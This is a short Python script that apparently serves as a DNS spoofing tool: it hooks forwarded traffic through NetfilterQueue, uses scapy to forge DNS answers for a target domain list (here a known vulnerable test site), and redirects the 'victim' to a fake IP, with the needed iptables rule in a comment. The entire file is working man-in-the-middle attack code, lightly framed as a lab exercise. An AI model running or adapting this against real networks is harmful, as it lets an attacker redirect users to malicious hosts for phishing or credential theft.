from scapy.all import *
from netfilterqueue import NetfilterQueue

# Your fake IP to redirect victim
FAKE_IP = "192.168.40.128"
TARGET_DOMAINS = ["testphp.vulnweb.com"]

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname.decode()

        for domain in TARGET_DOMAINS:
            if domain in qname:
                print(f"[+] Spoofing DNS request for {qname}")

                # Forge a fake DNS response
                answer = DNSRR(rrname=qname, rdata=FAKE_IP)
                scapy_packet[DNS].an = answer
                scapy_packet[DNS].ancount = 1

                # Remove checksum and length (they'll be recalculated)
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum

                # Set forged packet
                packet.set_payload(bytes(scapy_packet))

    packet.accept()

# Set iptables rule first:
# iptables -I FORWARD -j NFQUEUE --queue-num 0
nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)
print("[*] Waiting for DNS packets...")
nfqueue.run()
